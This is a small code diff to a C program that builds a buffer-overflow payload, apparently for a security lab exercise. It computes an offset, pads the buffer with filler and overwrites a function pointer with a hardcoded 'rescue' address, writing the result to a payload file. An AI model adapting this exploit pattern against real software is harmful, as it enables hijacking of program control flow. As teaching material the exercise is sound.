@@ -11,8 +11,9 @@ int main(int argc, char **argv)
     long funcptr_addr = 0xFFFFD088;
     long rescue_addr = 0x8049279;
     int offset = funcptr_addr - attack_buffer_addr;
-    char attack3_buffer[offset + 4]; // offsets key
-    memset(attack3_buffer, 'A', offset);
+    printf("Offset: %d\n", offset);
+    char attack3_buffer[offset + 4]; // offsets key + 4 bytes for functionPtr
+    memset(attack3_buffer, '*', offset);
     *(long*)(attack3_buffer + offset) = rescue_addr;
 
     write_to_file( "payloads/attack3-payload", attack3_buffer, sizeof(attack3_buffer), FILE_CLEAR );
